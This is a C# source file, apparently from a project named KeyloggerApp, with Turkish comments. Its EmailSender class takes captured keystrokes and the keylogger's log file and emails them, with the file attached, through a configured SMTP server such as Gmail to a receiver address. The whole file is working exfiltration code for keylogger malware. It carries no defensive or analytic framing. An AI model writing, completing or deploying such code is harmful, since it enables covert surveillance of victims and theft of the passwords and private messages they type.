using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Configuration;

namespace KeyloggerApp
{
    public class EmailSender
    {
        private string _smtpServer;
        private int _smtpPort;
        private string _senderEmail;
        private string _senderPassword;
        private string _receiverEmail;
        
        public EmailSender()
        {
            // App.config'den ayarları oku
            _smtpServer = ConfigurationManager.AppSettings["SmtpServer"] ?? "smtp.gmail.com";
            _smtpPort = int.Parse(ConfigurationManager.AppSettings["SmtpPort"] ?? "587");
            _senderEmail = ConfigurationManager.AppSettings["SenderEmail"] ?? "your-email@gmail.com";
            _senderPassword = ConfigurationManager.AppSettings["SenderPassword"] ?? "your-password";
            _receiverEmail = ConfigurationManager.AppSettings["ReceiverEmail"] ?? "your-email@gmail.com";
        }
        
        public void SendLogEmail(string logContent, string logFilePath)
        {
            try
            {
                // Email ayarlarının yapılandırılıp yapılandırılmadığını kontrol et
                if (_senderEmail == "your-email@gmail.com" || _senderPassword == "your-password")
                {
                    Console.WriteLine("[EMAIL] UYARI: Email ayarları yapılandırılmamış. App.config dosyasını düzenleyin.");
                    return;
                }
                
                MailMessage mail = new MailMessage();
                mail.From = new MailAddress(_senderEmail);
                mail.To.Add(_receiverEmail);
                mail.Subject = $"Keylogger Raporu - {DateTime.Now:dd/MM/yyyy HH:mm}";
                
                // Email içeriği
                string body = $@"
Keylogger Raporu
Tarih: {DateTime.Now:dd/MM/yyyy HH:mm:ss}
==============================================

Kaydedilen Tuşlar:
{logContent}

==============================================
Not: Bu email otomatik olarak gönderilmiştir.
";
                mail.Body = body;
                
                // Log dosyasını ekle
                if (File.Exists(logFilePath))
                {
                    Attachment attachment = new Attachment(logFilePath);
                    mail.Attachments.Add(attachment);
                }
                
                // SMTP ayarları
                SmtpClient smtp = new SmtpClient(_smtpServer);
                smtp.Port = _smtpPort;
                smtp.Credentials = new NetworkCredential(_senderEmail, _senderPassword);
                smtp.EnableSsl = true;
                
                smtp.Send(mail);
                Console.WriteLine($"[EMAIL] Log başarıyla gönderildi: {DateTime.Now:HH:mm:ss}");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[EMAIL HATASI] {ex.Message}");
            }
        }
    }
}


